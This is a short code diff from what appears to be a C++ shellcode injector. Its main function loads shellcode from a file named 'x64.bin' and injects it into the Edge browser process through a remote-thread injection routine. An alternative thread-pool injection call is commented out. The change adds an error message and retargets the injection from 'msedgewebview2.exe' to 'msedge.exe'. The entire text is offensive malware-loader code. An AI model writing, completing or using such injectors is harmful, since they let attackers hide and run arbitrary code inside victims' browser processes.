@@ -16,10 +16,11 @@ int main() {
 	LPVOID lpShellcode = nullptr;
 	DWORD dwShellcodeSize = 0;
 	if (!GetFileDataW(L"x64.bin", &lpShellcode, &dwShellcodeSize)) {
+		std::cout << "Failed GetFileDataW";
 		return -1;
 	}
 
 	//RemoteTpJobInsertion(lpShellcode, dwShellcodeSize);
-	wchar_t wsName[] = L"msedgewebview2.exe";
+	wchar_t wsName[] = L"msedge.exe";
 	CreateRemoteThreadInject(lpShellcode, dwShellcodeSize, wsName);
 }
